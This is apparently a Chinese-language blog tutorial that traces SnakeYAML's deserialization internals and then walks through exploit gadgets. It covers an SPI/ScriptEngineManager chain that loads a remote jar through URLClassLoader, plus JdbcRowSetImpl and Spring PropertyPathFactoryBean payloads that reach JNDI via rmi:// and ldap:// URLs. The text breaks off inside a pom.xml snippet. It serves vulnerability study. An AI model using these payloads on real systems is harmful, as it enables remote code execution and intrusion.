+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/17.png" class="" title="Pasted image 20260806105544">
+
+
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>打好断点，跟进load方法。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/18.png" class="" title="Pasted image 20260806105947">
+
+<p>在 <code>load()</code> 方法中会先 new 一个 <code>StreamReader</code>，将 yaml 数据通过构造函数赋给 StreamReader，再调用 <code>loadFromReader()</code> 方法。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/19.png" class="" title="Pasted image 20260806110025">
+
+<p>跟进loadFromReader方法。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/20.png" class="" title="Pasted image 20260806110131">
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">loadFromReader</span><span class="params">(StreamReader sreader, Class&lt;?&gt; type)</span> &#123;</span><br><span class="line">    <span class="comment">// 第1步：组装“编译器前端”</span></span><br><span class="line">    <span class="type">Composer</span> <span class="variable">composer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Composer</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ParserImpl</span>(sreader),  <span class="comment">// ① 词法分析器</span></span><br><span class="line">        <span class="built_in">this</span>.resolver,            <span class="comment">// ② 类型解析器</span></span><br><span class="line">        <span class="built_in">this</span>.loadingConfig        <span class="comment">// ③ 加载配置</span></span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第2步：把编译器前端挂载到构造器上</span></span><br><span class="line">    <span class="built_in">this</span>.constructor.setComposer(composer);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第3步：开始解析，返回最终结果</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.constructor.getSingleData(type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>Composer</code> 是 SnakeYAML 的<strong>语法树构建器</strong>，它把 YAML 的“事件流”转换成“节点树”。</p>
+<p>接着我们跟进getSingleData方法，此处的type是Object类。它先创建一个 Node 对象（其中调用 <code>getSingleNote()</code> 会根据流来生成一个文件，即将字符串按照 yaml 语法转为 Node 对象），然后判断当前 Node 是否为空且是否 Tag 为空，若不是则判断 yaml 格式数据的类型是否为 Object 类型、是否有根标签，这里都判断不通过，最后返回调用 <code>constructDocument()</code> 方法的结果。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/21.png" class="" title="Pasted image 20260806110640">
+
+<p>我们先跟进一下<code>composer.getSingleNode</code>方法看看。最终返回了一个MappingNode。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/22.png" class="" title="Pasted image 20260806111016">
+
+
+<p>我们继续跟进一下 <code>constructDocument()</code> 方法。<code>constructDocument()</code> 方法的最终目的是构建一个完整的 YAML 文件，如果文件是递归结构，再进行二次处理（这里的递归结构其实就是我后面会讲的 <code>[!!]</code> 这个）。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/23.png" class="" title="Pasted image 20260806111141">
+
+<p>主要逻辑在constructObject方法，我们跟进看看。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/24.png" class="" title="Pasted image 20260806111245">
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">constructObject</span><span class="params">(Node node)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.constructedObjects.containsKey(node) ? <span class="built_in">this</span>.constructedObjects.get(node) : <span class="built_in">this</span>.constructObjectNoCheck(node);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里其实就是检查缓存，看node是否已经被构建过了，没有被处理的话我们进入constructObjectNoCheck方法。它负责把一个 <code>Node</code> 节点真正变成 Java 对象，同时处理<strong>循环引用</strong>、<strong>两步构造</strong>等复杂场景。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/25.png" class="" title="Pasted image 20260806111336">
+
+<p><strong>先检查循环引用，再获取对应的构造器，实例化对象并缓存，最后处理两步构造（如集合、自定义对象）。</strong></p>
+<p><strong>什么是“两步构造”？</strong><br>有些对象<strong>不能一步构造完成</strong>，需要先创建空对象，再填充属性。比如：</p>
+<ul>
+<li><strong><code>Map</code> 对象</strong>：先创建 <code>HashMap</code>，再逐个添加键值对</li>
+<li><strong>自定义对象</strong>：先通过反射创建实例，再逐个设置字段值</li>
+<li><strong>集合对象</strong>：先创建 <code>ArrayList</code>，再逐个添加元素</li>
+</ul>
+<p><strong>流程</strong>：</p>
+<ol>
+<li><strong>第一步</strong>（<code>construct</code>）：创建空对象（如 <code>new HashMap()</code>）</li>
+<li><strong>第二步</strong>（<code>construct2ndStep</code>）：填充数据（如 <code>map.put(&quot;key&quot;, value)</code>）</li>
+</ol>
+<p>然后我们跟进<code>constructor.construct</code>，实例化对象的部分。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/26.png" class="" title="Pasted image 20260806111758">
+
+<p>这里的this是ConstructYamlObject。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/27.png" class="" title="Pasted image 20260806111830">
+
+<p>我们先跟进getConstructor方法看看。它的职责是：<strong>根据节点的类型（NodeId）找到对应的构造器（Construct），并确保节点的 Java 类型被正确设置。</strong></p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/28.png" class="" title="Pasted image 20260806120612">
+
+<p>然后我们跟进getClassForNode方法</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/29.png" class="" title="Pasted image 20260806122208">
+
+<p>继续跟进getClassForName方法，它是通过反射，给 Node 节点选取合适的构造类。同时此处可以初始化静态块里面的函数，这是一个很值得被注意的点。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/30.png" class="" title="Pasted image 20260806122308">
+
+<p>然后我们就能成功获取到对应的构造器。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/31.png" class="" title="Pasted image 20260806122606">
+
+<p>接着进入构造器的construct方法。这里是反序列化的终极工厂，负责把 <code>MappingNode</code>（YAML 的键值对结构）转换成 Java 对象。它处理了三种情况：<strong>Map、Set、自定义 JavaBean</strong>。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/32.png" class="" title="Pasted image 20260806122718">
+
+<p>此处我们的Person类肯定是自定义JavaBean，那么进入的就是else部分。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/33.png" class="" title="Pasted image 20260806123227">
+
+<p>实例化后要判断是否进行第二步构造，第一步其实就是构造出了一个Person对象的空壳，属性值都是null，然后我们要进入constructJavaBean2ndStep方法进行二次构造。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/34.png" class="" title="Pasted image 20260806123336">
+
+<p>其中会获取 yaml 格式数据中的属性的键值对，然后调用 <code>propert.set()</code> 来设置新建的目标对象的属性值。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/35.png" class="" title="Pasted image 20260806123914">
+
+<p>然后这个方法最终会返回一个object对象，就是经过第二步构造的完整对象。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/36.png" class="" title="Pasted image 20260806124019">
+
+<p>至此，反序列化部分结束。</p>
+<h1 id="一个坑点"><a href="#一个坑点" class="headerlink" title="一个坑点"></a>一个坑点</h1><p>修改了 <strong>Person.java</strong>，新增一个 public 的 school 以及 protected 的 province。在序列化的时候发现，<code>getSchool</code> 这个方法没被调用。反序列化的时候<code>setSchool</code>也没有被调用。</p>
+<p>在反序列化的最后一步，会调用 <code>propert.set()</code> 来设置新建的目标对象的属性值<br>而这个 Property 的设置在<code>org.yaml.snakeyaml.introspector.PropertyUtils#getPropertiesMap</code></p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/37.png" class="" title="Pasted image 20260806124418">
+
+<p>我们跟进getProperty方法</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/38.png" class="" title="Pasted image 20260806124437">
+
+<p>然后我们会逐步跟进到getPropertiesMap方法处</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/39.png" class="" title="Pasted image 20260806124629">
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/40.png" class="" title="Pasted image 20260806084121">
+<p>可以看到这个如果是 Public 修饰的话，这意味着：SnakeYAML 会把这个字段当作可访问的属性，直接通过反射读写它，不需要 getter&#x2F;setter！public 字段 → 直接加入 Property 缓存。</p>
+<h1 id="SnakeYaml反序列化漏洞之SPI链"><a href="#SnakeYaml反序列化漏洞之SPI链" class="headerlink" title="SnakeYaml反序列化漏洞之SPI链"></a>SnakeYaml反序列化漏洞之SPI链</h1><p>比较类似于 Fastjson 的漏洞，这里的 <code>!!</code> 就是 Fastjson 漏洞里面的 <code>@type</code></p>
+<p>与 Fastjson 不同的是，Fastjson 可以调用的 <code>getter/setter</code> 方法的攻击面很宽，而 SnakeYaml 只能够调用非 public，static 以及 transient 作用域的 setter 方法</p>
+<h2 id="利用-SPI-机制-基于-ScriptEngineManager-利用链"><a href="#利用-SPI-机制-基于-ScriptEngineManager-利用链" class="headerlink" title="利用 SPI 机制 - 基于 ScriptEngineManager 利用链"></a>利用 SPI 机制 - 基于 ScriptEngineManager 利用链</h2><p>调用栈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">newInstance:396, Class (java.lang)  </span><br><span class="line">nextService:380, ServiceLoader$LazyIterator (java.util)  </span><br><span class="line">next:404, ServiceLoader$LazyIterator (java.util)  </span><br><span class="line">next:480, ServiceLoader$1 (java.util)  </span><br><span class="line">initEngines:122, ScriptEngineManager (javax.script)  </span><br><span class="line">init:84, ScriptEngineManager (javax.script)  </span><br><span class="line">&lt;init&gt;:75, ScriptEngineManager (javax.script)  </span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)  </span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)  </span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)  </span><br><span class="line">newInstance:423, Constructor (java.lang.reflect)  </span><br><span class="line">construct:557, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)  </span><br><span class="line">construct:341, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)  </span><br><span class="line">constructObject:182, BaseConstructor (org.yaml.snakeyaml.constructor)  </span><br><span class="line">constructDocument:141, BaseConstructor (org.yaml.snakeyaml.constructor)  </span><br><span class="line">getSingleData:127, BaseConstructor (org.yaml.snakeyaml.constructor)  </span><br><span class="line">loadFromReader:450, Yaml (org.yaml.snakeyaml)  </span><br><span class="line">load:369, Yaml (org.yaml.snakeyaml)  </span><br><span class="line">main:10, Demo (BasicKnow.SnakeymlUnser)</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp使用"><a href="#exp使用" class="headerlink" title="exp使用"></a>exp使用</h3><p>exp：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SPInScriptEngineManager</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager &quot;</span> +  </span><br><span class="line">                <span class="string">&quot;[!!java.net.URLClassLoader &quot;</span> +  </span><br><span class="line">                <span class="string">&quot;[[!!java.net.URL [\&quot;http://xcdi1rgv45xnlhko7su6y8n22t8kwakz.oastify.com\&quot;]]]]\n&quot;</span>;  </span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        yaml.load(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">!!javax.script.ScriptEngineManager</span><br><span class="line">[</span><br><span class="line">    !!java.net.URLClassLoader</span><br><span class="line">    [</span><br><span class="line">        [</span><br><span class="line">            !!java.net.URL [<span class="string">&quot;http://...&quot;</span>]</span><br><span class="line">        ]</span><br><span class="line">    ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/41.png" class="" title="Pasted image 20260806085714">
+<p>成功接收到URLDNS请求<br>但是这个 EXP 只能简单的进行探测，如果要打的话，可以用这一个 Github 项目：<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload/">GitHub - artsploit&#x2F;yaml-payload: A tiny project for generating SnakeYAML deserialization payloads · GitHub</a><br>直接修改代码即可，脚本也比较简单，就是实现了 <code>ScriptEngineFactory</code> 接口，然后在静态代码块处填写需要执行的命令。将项目打包后挂载到 vps 端，使用 payload 进行反序列化后请求到该位置，实现 <code>java.net.URLClassLoader</code> 调用远程的类进行执行命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/42.png" class="" title="Pasted image 20260806090254">
+
+<p>打包后开启http服务</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">scriptenginemanager_exp</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager &quot;</span> +  </span><br><span class="line">                <span class="string">&quot;[!!java.net.URLClassLoader &quot;</span> +  </span><br><span class="line">                <span class="string">&quot;[[!!java.net.URL [\&quot;http://localhost:8888/yaml-payload.jar\&quot;]]]]\n&quot;</span>;  </span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        yaml.load(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/43.png" class="" title="Pasted image 20260806090408">
+
+<h3 id="SPI机制"><a href="#SPI机制" class="headerlink" title="SPI机制"></a>SPI机制</h3><p>SPI 以及 ScriptEngineManager 最早是在 SpEL 表达式里面被提到的，这里再复习一下。</p>
+<p>SPI ，全称为 Service Provider Interface，是一种服务发现机制。它通过在 ClassPath 路径下的 <code>META-INF/services</code> 文件夹查找文件，自动加载文件里所定义的类。也就是动态为某个接口寻找服务实现</p>
+<p>那么如果需要使用 SPI 机制需要在 Java classpath 下的 <code>META-INF/services/</code> 目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的<strong>实现类</strong>。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/44.png" class="" title="Pasted image 20260806092204">
+
+<p><strong>实现细节</strong>：程序会通过 <code>java.util.ServiceLoder</code> 动态装载实现模块，在 <code>META-INF/services</code> 目录下的配置文件寻找实现类的类名，通过 <code>Class.forName</code> 加载进来， <code>newInstance()</code> 反射创建对象，并存到缓存和列表里面。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里我们直接从 <code>org.yaml.snakeyaml.constructor.Constructor#getClassForName()</code> 这里开始看，去理解 SPI 机制造成的攻击。这里会加载类并返回，最后返回我们的<code>ScriptEngineManager</code>类，并获取其构造器constructor。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/45.png" class="" title="Pasted image 20260806134348">
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/46.png" class="" title="Pasted image 20260806134513">
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/47.png" class="" title="Pasted image 20260806134654">
+
+<p>然后我们继续跟进<code>construct</code>方法，也就是我们先前获取到的构造器的<code>construct</code>方法。<br>经过一些简单的判断后，我们进入else部分（自定义Sequence）</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/48.png" class="" title="Pasted image 20260806135336">
+
+<p>我们先new一个ArrayList。然后为 YAML 序列（<code>snode</code>）寻找一个“参数数量匹配”的 Java 构造器。而后将获取到的 <code>possibleConstructors</code> 获取到的第一个数组进行赋值并转换成 <code>Constructor</code> 类型。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/49.png" class="" title="Pasted image 20260806140314">
+
+<p>之后，对 c 进行实例化，我们可以跟进看一下，后续也都是一串 <code>newInstance()</code> 的调用，快进一下，直接到 <code>newInstance0</code> 这里</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/50.png" class="" title="Pasted image 20260806143121">
+
+<p>一开始加载的是 URL 类的，因为我们的 EXP 里面包含了三个类，这就和 Fastjson 的 AutoType 是一样的，前两个类作为第三个类的缓存。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/51.png" class="" title="Pasted image 20260806143143">
+
+<p>接着，当执行完 <code>newInstance()</code> 的时候，会到 <code>ScriptEngineManager</code> 里面，触发 SPI 机制，然后触发恶意代码。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/52.png" class="" title="Pasted image 20260806143313">
+
+
+<h1 id="SnakeYaml反序列化漏洞的Gadgets"><a href="#SnakeYaml反序列化漏洞的Gadgets" class="headerlink" title="SnakeYaml反序列化漏洞的Gadgets"></a>SnakeYaml反序列化漏洞的Gadgets</h1><h2 id="SPI"><a href="#SPI" class="headerlink" title="SPI"></a>SPI</h2><p>先看看上面SPI链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager   # 外部对象：脚本引擎管理器</span><br><span class="line">[   # 这是向 ScriptEngineManager 构造器传递的参数</span><br><span class="line">    !!java.net.URLClassLoader        # 参数对象：URL类加载器</span><br><span class="line">    [   # 这是向 URLClassLoader 构造器传递的参数</span><br><span class="line">        [   # 注意：这里多了一层方括号，实际上是 URL 数组</span><br><span class="line">            !!java.net.URL [&quot;http://localhost:8888/yaml-payload.jar&quot;]</span><br><span class="line">        ]</span><br><span class="line">    ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+<p>这里的 <code>[!!</code> 是作为 <code>javax.script.ScriptEngineManager</code> 的属性的，就等于我调用了 <code>javax.script.ScriptEngineManager</code> 这个类，其实我是在调用它的构造函数</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/53.png" class="" title="Pasted image 20260806143753">
+
+<p>相当于上图的loader参数其实是我们的URLClassLoader</p>
+<p>那么后面的 <code>java.net.URL</code> 呢，它是 <code>[[!!</code> 打头，说明是 URLClassLoder 的内部属性，我们可以去看 URLClassLoader 的构造函数，它要求我们传入一个 URL 类，所以 EXP 是这么来的</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/54.png" class="" title="Pasted image 20260806144806">
+
+<h2 id="JdbcRawSetImpl"><a href="#JdbcRawSetImpl" class="headerlink" title="JdbcRawSetImpl"></a>JdbcRawSetImpl</h2><p>调用链比较简单，尾部是 JNDI 注入，是在 <code>com.sun.rowset.JdbcRowSetImpl</code> 的 <code>connect()</code> 方法</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/55.png" class="" title="Pasted image 20260806145752">
+
+<p>熟悉的jndi注入，查找用法发现<code>setAutoCommit</code>方法，是可被利用的setter方法。</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/56.png" class="" title="Pasted image 20260806145854">
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/57.png" class="" title="Pasted image 20260806145919">
+
+<p>调用链如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JdbcRowSetImpl#setAutoCommit</span><br><span class="line">	JdbcRowSetImpl#connect</span><br><span class="line">		InitialContext#lookup</span><br></pre></td></tr></table></figure>
+
+<p>exp如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: \&quot;rmi://127.0.0.1:1099/Exploit\&quot;, autoCommit: true&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl\n&quot;</span> +  </span><br><span class="line">        <span class="string">&quot; dataSourceName: \&quot;rmi://127.0.0.1:1099/hello\&quot;\n&quot;</span> +  </span><br><span class="line">        <span class="string">&quot; autoCommit: true&quot;</span>;</span><br></pre></td></tr></table></figure>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/58.png" class="" title="Pasted image 20260806151956">
+<p>同时，我们要去触发的恶意 <code>dataSource</code> 属性的作用域是private，所以可用</p>
+<h2 id="Spring-PropertyPathFactoryBean"><a href="#Spring-PropertyPathFactoryBean" class="headerlink" title="Spring PropertyPathFactoryBean"></a>Spring PropertyPathFactoryBean</h2><p>exp如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringPropertyPathFactoryBeanEXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot; targetBeanName: \&quot;ldap://localhost:1099/Exploit\&quot;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot; propertyPath: Meteor_Kai\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot; beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;  shareableResources: [\&quot;ldap://localhost:1099/Exploit\&quot;]&quot;</span>;  </span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        yaml.load(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意此处漏洞利用需要添加pom.xml：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.27<span 